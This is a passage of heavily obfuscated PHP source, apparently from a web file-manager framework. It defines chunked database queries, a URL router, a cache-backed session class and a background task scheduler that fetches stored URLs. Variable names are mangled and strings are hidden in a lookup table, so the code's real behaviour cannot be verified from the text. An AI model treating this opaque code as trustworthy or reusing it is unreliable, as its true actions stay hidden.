$ã±ÄÈÅ¨ = $this->tablePrefix . $this->tableName; foreach ($ğš„¡±é as $’Ã„ÊÁÑ) { if (!is_array($’Ã„ÊÁÑ) || count($’Ã„ÊÁÑ) != 4) { continue; } $ª–ØÛ£á = $’Ã„ÊÁÑ[0] . $Æ¥Œ¦Öò[385] . $’Ã„ÊÁÑ[1] . $Æ¥Œ¦Öò[129]; $¶û¯”ü˜ = $’Ã„ÊÁÑ[2] . $Æ¥Œ¦Öò[385] . $’Ã„ÊÁÑ[3] . $Æ¥Œ¦Öò[129]; $úÍá¨ÍÙ = "\x75\160\144\x61\x74\x65\40{$ã±ÄÈÅ¨}\40\163\x65\164\40{$¶û¯”ü˜}\40\x77\150\145\162\145\40{$ª–ØÛ£á}\x3b"; $this->execute($úÍá¨ÍÙ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($²Ş½£ç = false, $€ñ“Õ¡‚ = false) { $this->_chunkEvent = $²Ş½£ç; $this->_chunkEventParam = $€ñ“Õ¡‚; } private function chunkEventCheck($±­ñŠŸÎ) { if (!$this->_chunkEvent) { return; } $ÂÆ²µæ¯ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ÂÆ²µæ¯[$_SERVER[ë¦»ºéÌ][386]] = $±­ñŠŸÎ; Hook::trigger($this->_chunkEvent, $ÂÆ²µæ¯); } public function addAll($¼ªë†›ò, $ÓâåóÑü = array(), $•›ÄÊ·ø = false) { $­›è›ô¡ =& $_SERVER[ë¦»ºéÌ]; ignore_timeout(); $ñÒÎ‰˜… = self::SQL_WHERE_IN_CHUNK; if (empty($¼ªë†›ò)) { $this->error = think_lang($­›è›ô¡[277]); return !1; } $ÓâåóÑü = $this->_parseOptions($ÓâåóÑü); foreach ($¼ªë†›ò as $½Ïš³ğ­ => $Œ¼ûâ”­) { $¼ªë†›ò[$½Ïš³ğ­] = $this->_facade($Œ¼ûâ”­); $this->_beforeInsert($¼ªë†›ò[$½Ïš³ğ­], $ÓâåóÑü); } if (method_exists($this->db, $­›è›ô¡[278])) { for ($¤÷Ğê¤í = 0; $¤÷Ğê¤í < count($¼ªë†›ò); $¤÷Ğê¤í += $ñÒÎ‰˜…) { $á´­ÃÃÍ = array_slice($¼ªë†›ò, $¤÷Ğê¤í, $ñÒÎ‰˜…); if (!is_array($á´­ÃÃÍ) || count($á´­ÃÃÍ) == 0) { break; } $» ‰¼ãà = $this->db->insertAll($á´­ÃÃÍ, $ÓâåóÑü, $•›ÄÊ·ø); $this->chunkEventCheck(count($á´­ÃÃÍ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($¼ªë†›ò as $½Ïš³ğ­ => $Œ¼ûâ”­) { $» ‰¼ãà = $this->db->insert($Œ¼ûâ”­, $ÓâåóÑü, $•›ÄÊ·ø); } $this->commit(); } if (!1 !== $» ‰¼ãà) { $İ‰®¹û² = $this->getLastInsID(); if ($İ‰®¹û²) { return $İ‰®¹û²; } } return $» ‰¼ãà; } public function save($éº¢®–ù = '', $ß·ÛØÈÛ = array()) { $Š­’ø³” =& $_SERVER[ë¦»ºéÌ]; $®äèğë = self::SQL_WHERE_IN_CHUNK; $‚üÑâ œ = $this->optionsValue(); $Í·ƒúºÇ = $this->findWhereField($‚üÑâ œ); if (!$Í·ƒúºÇ) { return parent::save($éº¢®–ù, $ß·ÛØÈÛ); } $âŠ°¹ÍÀ = 0; $•ò³õºØ = $‚üÑâ œ[$Š­’ø³”[281]][$Í·ƒúºÇ][1]; $•ò³õºØ = is_array($•ò³õºØ) ? $•ò³õºØ : array(); $ôô¶½ª = count($•ò³õºØ); for ($ù†–ôÛ™ = 0; $ù†–ôÛ™ < $ôô¶½ª; $ù†–ôÛ™ += $®äèğë) { $ãÛÒîáÌ = array_slice($•ò³õºØ, $ù†–ôÛ™, $®äèğë); if (!is_array($ãÛÒîáÌ) || count($ãÛÒîáÌ) == 0) { break; } $‚üÑâ œ[$Š­’ø³”[281]][$Í·ƒúºÇ][1] = $ãÛÒîáÌ; $this->optionsValue($‚üÑâ œ); $âŠ°¹ÍÀ += parent::save($éº¢®–ù, $ß·ÛØÈÛ); $this->chunkEventCheck(count($ãÛÒîáÌ)); } $this->chunkEventSet(); return $âŠ°¹ÍÀ; } public function add($å‘©ñæ˜ = '', $ÄŞîôÚ• = array(), $è· ğà™ = false) { if ($this->addTaskStatus && is_array($å‘©ñæ˜)) { $this->addTaskData[] = $å‘©ñæ˜; return; } return parent::add($å‘©ñæ˜, $ÄŞîôÚ•, $è· ğà™); } public function parseWhereLike($ªáÔˆâê, $ıã¹‚›¬ = '', $ªë±‰† = false, &$•ØçÉ¥Ç = false) { $ïÉ˜Üª¨ =& $_SERVER[ë¦»ºéÌ]; $µÔ½ÍÀ = $GLOBALS[$ïÉ˜Üª¨[6]][$ïÉ˜Üª¨[387]]; if (!$µÔ½ÍÀ[$ïÉ˜Üª¨[388]]) { return $ªáÔˆâê; } if (!is_array($ªáÔˆâê)) { return $ªáÔˆâê; } $”‘Ç÷² = array(); $¦‰Ãæßø = 0; foreach ($ªáÔˆâê as $°œƒüËƒ => $ñ¦ÒÌ”ä) { if (is_array($ñ¦ÒÌ”ä) && count($ñ¦ÒÌ”ä) == 2 && $ñ¦ÒÌ”ä[0] == $ïÉ˜Üª¨[389] && is_string($ñ¦ÒÌ”ä[1]) && substr($ñ¦ÒÌ”ä[1], 0, 1) == $ïÉ˜Üª¨[390] && substr($ñ¦ÒÌ”ä[1], strlen($ñ¦ÒÌ”ä[1]) - 1, 1) == $ïÉ˜Üª¨[390]) { $•ØçÉ¥Ç = !0; $ä»ÄÕ ú = is_string($°œƒüËƒ) ? $°œƒüËƒ : $ıã¹‚›¬; $‚ä×Ãä = substr($ñ¦ÒÌ”ä[1], 1, strlen($ñ¦ÒÌ”ä[1]) - 2); $‚ä×Ãä = $this->db->escapeString($‚ä×Ãä); if (!strpos($ä»ÄÕ ú, $ïÉ˜Üª¨[10])) { $ä»ÄÕ ú = $ïÉ˜Üª¨[391] . $ä»ÄÕ ú . $ïÉ˜Üª¨[391]; } $èà¶µÓ× = $ïÉ˜Üª¨[193] . $‚ä×Ãä . $ïÉ˜Üª¨[193]; if ($µÔ½ÍÀ[$ïÉ˜Üª¨[392]]) { $èà¶µÓ× = $ïÉ˜Üª¨[393] . $‚ä×Ãä . $ïÉ˜Üª¨[394]; if ($µÔ½ÍÀ[$ïÉ˜Üª¨[395]]) { $èà¶µÓ× = $ïÉ˜Üª¨[394] . $‚ä×Ãä . $ïÉ˜Üª¨[393]; } } $”‘Ç÷²[$¦‰Ãæßø] = $ïÉ˜Üª¨[396] . $ä»ÄÕ ú . $ïÉ˜Üª¨[397] . $èà¶µÓ× . $ïÉ˜Üª¨[398]; $¦‰Ãæßø++; continue; } if (is_array($ñ¦ÒÌ”ä)) { $ıã¹‚›¬ = is_string($°œƒüËƒ) ? $°œƒüËƒ : $ıã¹‚›¬; $ñ¦ÒÌ”ä = $this->parseWhereLike($ñ¦ÒÌ”ä, $ıã¹‚›¬, !0, $•ØçÉ¥Ç); } if (is_numeric($°œƒüËƒ)) { $”‘Ç÷²[$¦‰Ãæßø] = $ñ¦ÒÌ”ä; $¦‰Ãæßø++; } else { $”‘Ç÷²[$°œƒüËƒ] = $ñ¦ÒÌ”ä; } } if ($•ØçÉ¥Ç && !$ªë±‰†) { } return $”‘Ç÷²; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ƒëãäÂ = array()) { $íÑ½¥Œ– =& $_SERVER[ë¦»ºéÌ]; $ı¿ì½Ã¾ = self::SQL_WHERE_IN_CHUNK; $ÎÍü¦’ = $this->optionsValue(); $´†Ø¼€ = $this->findWhereField($ÎÍü¦’); if (!$´†Ø¼€ || isset($ÎÍü¦’[$íÑ½¥Œ–[298]]) || isset($ÎÍü¦’[$íÑ½¥Œ–[359]])) { return parent::select($ƒëãäÂ); } $ÇööŸÌÀ = $ÎÍü¦’[$íÑ½¥Œ–[281]][$´†Ø¼€][1]; $ÇööŸÌÀ = is_array($ÇööŸÌÀ) ? $ÇööŸÌÀ : array(); $¯õ’¡Š = null; for ($„’¤Ğ½ = 0; $„’¤Ğ½ < count($ÇööŸÌÀ); $„’¤Ğ½ += $ı¿ì½Ã¾) { $Ÿä¬°• = array_slice($ÇööŸÌÀ, $„’¤Ğ½, $ı¿ì½Ã¾); if (!is_array($Ÿä¬°•) || count($Ÿä¬°•) == 0) { break; } $ÎÍü¦’[$íÑ½¥Œ–[281]][$´†Ø¼€][1] = $Ÿä¬°•; $this->optionsValue($ÎÍü¦’); $óÛÑç‰½ = parent::select($ƒëãäÂ); if (!$óÛÑç‰½) { continue; } $¯õ’¡Š = is_array($¯õ’¡Š) ? $¯õ’¡Š : array(); $¯õ’¡Š = array_merge($¯õ’¡Š, $óÛÑç‰½); } return $¯õ’¡Š; } public function delete($­Ô¬Ñ† = array()) { $§º¼”¸è =& $_SERVER[ë¦»ºéÌ]; $ñéóÊ‡ = self::SQL_WHERE_IN_CHUNK; $‰‰µ›ö = $this->optionsValue(); $Û”Ååá¢ = $this->findWhereField($‰‰µ›ö); if (!$Û”Ååá¢) { return parent::delete($­Ô¬Ñ†); } $ššÓŸÂë = 0; $Ã²¿²ÚŞ = $‰‰µ›ö[$§º¼”¸è[281]][$Û”Ååá¢][1]; $Ã²¿²ÚŞ = is_array($Ã²¿²ÚŞ) ? $Ã²¿²ÚŞ : array(); for ($²ãÒµË˜ = 0; $²ãÒµË˜ < count($Ã²¿²ÚŞ); $²ãÒµË˜ += $ñéóÊ‡) { $ƒ¡šŠÁç = array_slice($Ã²¿²ÚŞ, $²ãÒµË˜, $ñéóÊ‡); if (!is_array($ƒ¡šŠÁç) || count($ƒ¡šŠÁç) == 0) { break; } $‰‰µ›ö[$§º¼”¸è[281]][$Û”Ååá¢][1] = $ƒ¡šŠÁç; $this->optionsValue($‰‰µ›ö); $ššÓŸÂë += parent::delete($­Ô¬Ñ†); } return $ššÓŸÂë; } private function findWhereField($úù¦èÉğ) { $²î‘Ë‹» =& $_SERVER[ë¦»ºéÌ]; $ËıôæÍ— = self::SQL_WHERE_IN_CHUNK; if (!is_array($úù¦èÉğ) || !is_array($úù¦èÉğ[$²î‘Ë‹»[281]])) { return !1; } foreach ($úù¦èÉğ[$²î‘Ë‹»[281]] as $—à‡ı¾Ã => $Ö›Óù¹Ã) { if (is_array($Ö›Óù¹Ã) && isset($Ö›Óù¹Ã[0]) && is_string($Ö›Óù¹Ã[0]) && strtolower($Ö›Óù¹Ã[0]) == $²î‘Ë‹»[7] && is_array($Ö›Óù¹Ã[1]) && count($Ö›Óù¹Ã[1]) > $ËıôæÍ—) { ignore_timeout(); return $—à‡ı¾Ã; } } return !1; } public function setMasterDB($ƒÈ£ÂšÓ = true) { think_config($_SERVER[ë¦»ºéÌ][399], $ƒÈ£ÂšÓ); } } goto fÈ¤ØÊ…ñå; dåèªÓå…: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\171" => "\133\x5e\x2f\x5d\x2b", "\72\x6e\x75\155" => "\x5b\x30\55\x39\x5d\53", "\72\x61\x6c\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($•Òıİ£æ, $ŞÉ¢äÚ©) { $ïÈà¶ =& $_SERVER[ë¦»ºéÌ]; if ($•Òıİ£æ == $ïÈà¶[1577]) { $³Èº‡Â¬ = array_map($ïÈà¶[1578], $ŞÉ¢äÚ©[0]); $áœ¾ßÌÃ = strpos($ŞÉ¢äÚ©[1], $ïÈà¶[8]) === 0 ? $ŞÉ¢äÚ©[1] : $ïÈà¶[8] . $ŞÉ¢äÚ©[1]; $¸óÊË›Ü = $ŞÉ¢äÚ©[2]; } else { $³Èº‡Â¬ = null; $áœ¾ßÌÃ = strpos($ŞÉ¢äÚ©[0], $ïÈà¶[8]) === 0 ? $ŞÉ¢äÚ©[0] : $ïÈà¶[8] . $ŞÉ¢äÚ©[0]; $¸óÊË›Ü = $ŞÉ¢äÚ©[1]; } array_push(self::$maps, $³Èº‡Â¬); array_push(self::$routes, $áœ¾ßÌÃ); array_push(self::$methods, strtoupper($•Òıİ£æ)); array_push(self::$callbacks, $¸óÊË›Ü); } public static function error($Ÿ€¬İ¾ë) { self::$errorCallback = $Ÿ€¬İ¾ë; } public static function haltOnMatch($¬œÛ¨ë = true) { self::$halts = $¬œÛ¨ë; } public static function dispatch() { $ƒ¾™“µÅ =& $_SERVER[ë¦»ºéÌ]; $ôë¾«ãõ = parse_url($_SERVER[$ƒ¾™“µÅ[1579]], PHP_URL_PATH); $™³¥ÏÌ = $_SERVER[$ƒ¾™“µÅ[168]]; $¬ÛÆë­ó = array_keys(static::$patterns); $Õ¸ı›Ö’ = array_values(static::$patterns); $Éâ˜ùÁÛ = !1; self::$routes = preg_replace($ƒ¾™“µÅ[1247], $ƒ¾™“µÅ[8], self::$routes); if (in_array($ôë¾«ãõ, self::$routes)) { $®¹òè—¦ = array_keys(self::$routes, $ôë¾«ãõ); foreach ($®¹òè—¦ as $Íã¸êÔ) { if (self::$methods[$Íã¸êÔ] == $™³¥ÏÌ || self::$methods[$Íã¸êÔ] == $ƒ¾™“µÅ[1580] || in_array($™³¥ÏÌ, self::$maps[$Íã¸êÔ])) { $Éâ˜ùÁÛ = !0; if (!is_object(self::$callbacks[$Íã¸êÔ])) { $ÄØ¨áµÜ = explode($ƒ¾™“µÅ[8], self::$callbacks[$Íã¸êÔ]); $ŸÎ—¼ = end($ÄØ¨áµÜ); $›©èÑ‹Á = explode($ƒ¾™“µÅ[1581], $ŸÎ—¼); $Á«îûù¨ = new $›©èÑ‹Á[0](); $Á«îûù¨->{$›©èÑ‹Á[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Íã¸êÔ]); if (self::$halts) { return; } } } } } else { $¨’ëÀöÚ = 0; foreach (self::$routes as $Íã¸êÔ) { if (strpos($Íã¸êÔ, $ƒ¾™“µÅ[4]) !== !1) { $Íã¸êÔ = str_replace($¬ÛÆë­ó, $Õ¸ı›Ö’, $Íã¸êÔ); } if (preg_match($ƒ¾™“µÅ[1582] . $Íã¸êÔ . $ƒ¾™“µÅ[1583], $ôë¾«ãõ, $µÂø«ù¥)) { if (self::$methods[$¨’ëÀöÚ] == $™³¥ÏÌ || self::$methods[$¨’ëÀöÚ] == $ƒ¾™“µÅ[1580] || !empty(self::$maps[$¨’ëÀöÚ]) && in_array($™³¥ÏÌ, self::$maps[$¨’ëÀöÚ])) { $Éâ˜ùÁÛ = !0; array_shift($µÂø«ù¥); if (!is_object(self::$callbacks[$¨’ëÀöÚ])) { $ÄØ¨áµÜ = explode($ƒ¾™“µÅ[8], self::$callbacks[$¨’ëÀöÚ]); $ŸÎ—¼ = end($ÄØ¨áµÜ); $›©èÑ‹Á = explode($ƒ¾™“µÅ[1581], $ŸÎ—¼); $Á«îûù¨ = new $›©èÑ‹Á[0](); if (!method_exists($Á«îûù¨, $›©èÑ‹Á[1])) { echo $ƒ¾™“µÅ[1584]; } else { call_user_func_array(array($Á«îûù¨, $›©èÑ‹Á[1]), $µÂø«ù¥); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$¨’ëÀöÚ], $µÂø«ù¥); if (self::$halts) { return; } } } } $¨’ëÀöÚ++; } } if ($Éâ˜ùÁÛ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Ñô±èªú =& $_SERVER[ë¦»ºéÌ]; header($_SERVER[$Ñô±èªú[1585]] . $Ñô±èªú[1586]); echo $Ñô±èªú[1587]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ƒ¾™“µÅ[1579]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ä’ëõÅ© =& $_SERVER[ë¦»ºéÌ]; static $ôÉÂ‰–² = false; if ($ôÉÂ‰–²) { return $ôÉÂ‰–²; } $öñÌĞì = $GLOBALS[$ä’ëõÅ©[6]][$ä’ëõÅ©[355]]; self::$sessionTime = $öñÌĞì[$ä’ëõÅ©[1588]]; $€íö­Ç = isset($GLOBALS[$ä’ëõÅ©[1589]]) ? $GLOBALS[$ä’ëõÅ©[1589]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($€íö­Ç)) { self::$sessionSign = Cookie::get($€íö­Ç); } else { self::$sessionSign = guid(); } } Cookie::setSafe($€íö­Ç, self::$sessionSign, self::$sessionTime); $À”Íºï² = $öñÌĞì[$ä’ëõÅ©[1590]]; $ûÙÄ¿Ğö = $öñÌĞì[$À”Íºï²]; $êä›”ôí = $öñÌĞì[$ä’ëõÅ©[812]]; switch ($À”Íºï²) { case $ä’ëõÅ©[31]: self::$handle = Model($ä’ëõÅ©[813]); break; case $ä’ëõÅ©[814]: self::$handle = new CacheRedis($ûÙÄ¿Ğö, $êä›”ôí); break; case $ä’ëõÅ©[815]: self::$handle = new CacheMemcached($ûÙÄ¿Ğö, $êä›”ôí); break; case $ä’ëõÅ©[204]: $ûÙÄ¿Ğö[$ä’ëõÅ©[88]] = $ûÙÄ¿Ğö[$ä’ëõÅ©[88]] . $ä’ëõÅ©[1591]; self::$handle = new CacheFile($ûÙÄ¿Ğö, $êä›”ôí); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ôÉÂ‰–² = new self(); return $ôÉÂ‰–²; } public static function getBySign($´úİ½Š‡) { CacheLock::lock($´úİ½Š‡); $ôó¶‹¤„ = self::$handle->get($´úİ½Š‡); CacheLock::unlock($´úİ½Š‡); $ôó¶‹¤„ = unserialize($ôó¶‹¤„); return is_array($ôó¶‹¤„) ? $ôó¶‹¤„ : array(); } public static function setBySign($İÂ¸Â‘, $ØåÒ”Ù®) { CacheLock::lock($İÂ¸Â‘); self::$handle->set($İÂ¸Â‘, serialize($ØåÒ”Ù®), self::$sessionTime); CacheLock::unlock($İÂ¸Â‘); } public static function sign($ØŠÇ¤ˆ = false) { $ØŠÇ¤ˆ && (self::$sessionSign = $ØŠÇ¤ˆ); self::init(); return self::$sessionSign; } public static function set($ß’ÅÊ¥», $Ö±¹ú‹¹ = false) { self::init(); if (is_array($ß’ÅÊ¥»)) { foreach ($ß’ÅÊ¥» as $Ğä·‘ã• => $ª€ñ©™) { array_set_value(self::$data, $Ğä·‘ã•, $ª€ñ©™); } } else { array_set_value(self::$data, $ß’ÅÊ¥», $Ö±¹ú‹¹); } self::setBySign(self::$sessionSign, self::$data); } public static function get($­«©´êÑ = false) { self::init(); if (!$­«©´êÑ) { return self::$data; } return array_get_value(self::$data, $­«©´êÑ); } public static function remove($§µëä‚É) { self::init(); unset(self::$data[$§µëä‚É]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ë¦»ºéÌ][817])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Àá·£Ê =& $_SERVER[ë¦»ºéÌ]; if (self::valueGet($Àá·£Ê[734]) != $Àá·£Ê[99]) { return; } if (self::valueGet($Àá·£Ê[1592]) == $Àá·£Ê[99]) { $ü™ıÖ¯§ = self::valueGet($Àá·£Ê[1593]); if (time() - $ü™ıÖ¯§ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); self::valueSet($Àá·£Ê[1592], $Àá·£Ê[99]); self::log($Àá·£Ê[1594]); Hook::bind($Àá·£Ê[1595], $Àá·£Ê[1596]); $Í˜œŠê = 0; while (!0) { self::cacheClear(); if (self::valueGet($Àá·£Ê[734]) != $Àá·£Ê[99]) { self::valueSet($Àá·£Ê[1592], $Àá·£Ê[202]); self::log($Àá·£Ê[1597]); die; } $ã—Üø°Ş = time(); if ($ã—Üø°Ş - $Í˜œŠê >= 60) { self::valueSet(array($Àá·£Ê[1592] => $Àá·£Ê[99], $Àá·£Ê[1593] => $ã—Üø°Ş), !1); $Í˜œŠê = $ã—Üø°Ş; } if (!file_exists(USER_SYSTEM . $Àá·£Ê[1598])) { self::valueSet(array($Àá·£Ê[1592] => $Àá·£Ê[202], $Àá·£Ê[734] => $Àá·£Ê[202]), !1); self::log($Àá·£Ê[1599]); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $·È—ˆ³¢ =& $_SERVER[ë¦»ºéÌ]; http_close(); self::valueSet($·È—ˆ³¢[734], $·È—ˆ³¢[202]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($·È—ˆ³¢[1592] => $·È—ˆ³¢[202], $·È—ˆ³¢[734] => $·È—ˆ³¢[99]), !1); } public static function shutdownEvent() { $ãòçÏÕ“ =& $_SERVER[ë¦»ºéÌ]; self::valueSet($ãòçÏÕ“[1592], $ãòçÏÕ“[202]); self::log($ãòçÏÕ“[1600]); } public static function config($¹êâÂÎê, $ÏıØÒŠ´) { self::valueSet($_SERVER[ë¦»ºéÌ][734], $¹êâÂÎê); } private static function taskRunAll() { $‰ªß¥õ¥ =& $_SERVER[ë¦»ºéÌ]; $ãÀèĞĞ› = timeFloat(); $‘×Ïëï  = Model($‰ªß¥õ¥[1601])->listData(); $Íú°ÀÚ— = count($‘×Ïëï ); for ($œé‡œ“° = 0; $œé‡œ“° < $Íú°ÀÚ—; $œé‡œ“°++) { $’¿¸ŞÔø = $‘×Ïëï [$œé‡œ“°]; if (!$’¿¸ŞÔø[$‰ªß¥õ¥[403]] || $’¿¸ŞÔø[$‰ªß¥õ¥[1602]] != $‰ªß¥õ¥[99]) { continue; } if (!self::taskTimeCheck($’¿¸ŞÔø)) { continue; } self::taskRun($’¿¸ŞÔø); } Hook::trigger($‰ªß¥õ¥[1603]); self::taskQueueRun($ãÀèĞĞ›); } private static function taskQueueRun($¦ô£ÉŞ) { $‘¤Í÷‡ò = 10; while (!0) { $Ù¼¬–ùÉ = TaskQueue::run(); if ($Ù¼¬–ùÉ === !1) { break; } if (timeFloat() - $¦ô£ÉŞ >= $‘¤Í÷‡ò) { break; } } } private static function taskTimeCheck($ê×Òè‘) { $ñ•÷  ’ =& $_SERVER[ë¦»ºéÌ]; $„…«Ã×„ = json_decode($ê×Òè‘[$ñ•÷  ’[208]], !0); $­–ò²¿ì = intval($ê×Òè‘[$ñ•÷  ’[1593]]); $Ìı„Ò­ = strtotime($ñ•÷  ’[1604] . $„…«Ã×„[$ñ•÷  ’[1605]] . $ñ•÷  ’[1606]) - strtotime($ñ•÷  ’[1607]); $Œ­ã·ûÉ = time() - strtotime(date($ñ•÷  ’[1608]) . $ñ•÷  ’[1609]); $ÄË‘ç„­ = $Œ­ã·ûÉ >= $Ìı„Ò­ && $Œ­ã·ûÉ <= $Ìı„Ò­ + 3600; switch ($„…«Ã×„[$ñ•÷  ’[43]]) { case $ñ•÷  ’[1610]: if (time() - $­–ò²¿ì < 3600 * 24 * 30) { return !1; } if ($„…«Ã×„[$ñ•÷  ’[1610]] == date($ñ•÷  ’[1611]) && $ÄË‘ç„­) { return !0; } break; case $ñ•÷  ’[1612]: if (time() - $­–ò²¿ì < 3600 * 24 * 7) { return !1; } $æ™äÓó = date($ñ•÷  ’[1613]) == 0 ? 7 : date($ñ•÷  ’[1613]); if ($„…«Ã×„[$ñ•÷  ’[1612]] == $æ™äÓó && $ÄË‘ç„­) { return !0; } break; case $ñ•÷  ’[1605]: if (time() - $­–ò²¿ì < 3600 * 24) { return !1; } if ($ÄË‘ç„­) { return !0; } break; case $ñ•÷  ’[1614]: if (time() - $­–ò²¿ì >= floatval($„…«Ã×„[$ñ•÷  ’[1614]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $“úñƒîŒ =& $_SERVER[ë¦»ºéÌ]; static $ÎŸäœş÷ = 0; $ÂäúÀ¯Œ = 300; if (!$ÎŸäœş÷) { $ÎŸäœş÷ = time(); } if (time() - $ÎŸäœş÷ < $ÂäúÀ¯Œ) { return; } $ÎŸäœş÷ = time(); $ñ¦•ÊÇ = Model($“úñƒîŒ[515])->db($“úñƒîŒ[12]); if ($ñ¦•ÊÇ) { $ñ¦•ÊÇ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($“úñƒîŒ[1615], $“úñƒîŒ[1616]); die; } } public static function taskRun($àé÷ªÚ‘) { $ñº•¦³ã =& $_SERVER[ë¦»ºéÌ]; self::log($ñº•¦³ã[1617] . $àé÷ªÚ‘[$ñº•¦³ã[403]] . $ñº•¦³ã[1618] . $àé÷ªÚ‘[$ñº•¦³ã[42]] . $ñº•¦³ã[1619] . $àé÷ªÚ‘[$ñº•¦³ã[1620]]); Model($ñº•¦³ã[1601])->run($àé÷ªÚ‘[$ñº•¦³ã[403]]); $ÏÆ¥ÍÒş = timeFloat(); $öªÅ¦ø€ = $ñº•¦³ã[12]; switch ($àé÷ªÚ‘[$ñº•¦³ã[43]]) { case $ñº•¦³ã[313]: $±ïõç¥Ò = url_request($àé÷ªÚ‘[$ñº•¦³ã[1620]], $ñº•¦³ã[237], !1, !1, !1, !1, 10); if ($±ïõç¥Ò[$ñº•¦³ã[734]]) { $öªÅ¦ø€ = strlen($±ïõç¥Ò[$ñº•¦³ã[1171]]); } break; case $ñº•¦³ã[236]: $öªÅ¦ø€ = Hook::apply($àé÷ªÚ‘[$ñº•¦³ã[1620]]); default: break; } Model($ñº•¦³ã[1621])->add(array($ñº•¦³ã[1622] => $ñº•¦³ã[12], $ñº•¦³ã[1623] => $ñº•¦³ã[202], $ñº•¦³ã[43] => $ñº•¦³ã[1624] . $àé÷ªÚ‘[$ñº•¦³ã[403]], $ñº•¦³ã[1625] => json_encode(array($ñº•¦³ã[42] => $àé÷ªÚ‘[$ñº•¦³ã[42]], $ñº•¦³ã[1626] => timeFloat() - $ÏÆ¥ÍÒş, $ñº•¦³ã[299] => $öªÅ¦ø€)))); $Ë·›É¨Í = $öªÅ¦ø€ ? $ñº•¦³ã[1627] . $öªÅ¦ø€ : $ñº•¦³ã[12]; self::log($ñº•¦³ã[1628] . $àé÷ªÚ‘[$ñº•¦³ã[403]] . $ñº•¦³ã[538] . $Ë·›É¨Í); return !0; } private static function valueGet($ÔÇƒı¹Ï) { $¦åôÎî² =& $_SERVER[ë¦»ºéÌ]; $åôµĞ— = $¦åôÎî²[1629]; $–‡ù•÷û = Model($¦åôÎî²[435])->get($ÔÇƒı¹Ï, $åôµĞ—); if (is_null($–‡ù•÷û)) { Model($¦åôÎî²[435])->set($¦åôÎî²[734], $¦åôÎî²[99], $åôµĞ—); Model($¦åôÎî²[435])->set($¦åôÎî²[1592], $¦åôÎî²[202], $åôµĞ—); $–‡ù•÷û = Model($¦åôÎî²[435])->get($ÔÇƒı¹Ï, $åôµĞ—); } return $–‡ù•÷û; } private static function valueSet($ÏûÆìİ, $è¢èÈ’•) { $ ª‹í£Ö =& $_SERVER[ë¦»ºéÌ]; $Éù‘ôÛ§ = $ ª‹í£Ö[1630]; CacheLock::lock($Éù‘ôÛ§); $Û‹ßèïã = Model($ ª‹í£Ö[435])->set($ÏûÆìİ, $è¢èÈ’•, $ ª‹í£Ö[1629]); CacheLock::unlock($Éù‘ôÛ§); return $Û‹ßèïã; } protected static function log($ªËº³œİ) { write_log($ªËº³œİ, $_SERVER[ë¦»ºéÌ][1616]); } private static function cacheClear() { $ëûöïÊÒ =& $_SERVER[ë¦»ºéÌ]; Cache::clearMemory(Model($ëûöïÊÒ[435])->cacheKey($ëûöïÊÒ[1629])); Cache::clearMemory(Model($ëûöïÊÒ[435])->cacheKey($ëûöïÊÒ[1631])); Model($ëûöïÊÒ[1601])->cacheClear(); self::closeDatabase(); } } goto aÆæ¯îó¯ß; fÈ¤ØÊ…ñå: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\164\x65\x6d\117\x70\164\x69\x6f\x6e"; public $field = array(); public function listData($ëíŒÒ¶Í = false, $Ûâ¨¡îŠ = "\155\x6f\144\x69\146\x79\x54\151\x6d\x65", $‚½Ï–Å¹ = false) { $¤ÔÓÊÍ× = Model($this->modelType)->get(!1, $this->optionType, !0); $ÜşÕèÛï = array_values($¤ÔÓÊÍ×); if ($ÜşÕèÛï && $ÜşÕèÛï[0] && !is_array($ÜşÕèÛï[0])) { Model($this->modelType)->cacheRemove($this->optionType); $¤ÔÓÊÍ× = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$¤ÔÓÊÍ×) { return $ëíŒÒ¶Í ? null : array(); } if (!$ëíŒÒ¶Í) { $¤ÔÓÊÍ× = array_filter(array_values($¤ÔÓÊÍ×)); return array_sort_by($¤ÔÓÊÍ×, $Ûâ¨¡îŠ, $‚½Ï–Å¹); } return $¤ÔÓÊÍ×[$_SERVER[ë¦»ºéÌ][400] . $ëíŒÒ¶Í]; } public function insert($§üî¬–æ) { $…­˜Š°ª =& $_SERVER[ë¦»ºéÌ]; $§üî¬–æ = array_field_key($§üî¬–æ, $this->field); $­»©è§¨ = Model($this->modelType)->get($…­˜Š°ª[401], $this->optionType . $…­˜Š°ª[402]); $­»©è§¨ = $­»©è§¨ ? $­»©è§¨ : 0; $§üî¬–æ[$…­˜Š°ª[403]] = ++$­»©è§¨; $§üî¬–æ[$…­˜Š°ª[205]] = time(); $§üî¬–æ[$…­˜Š°ª[96]] = 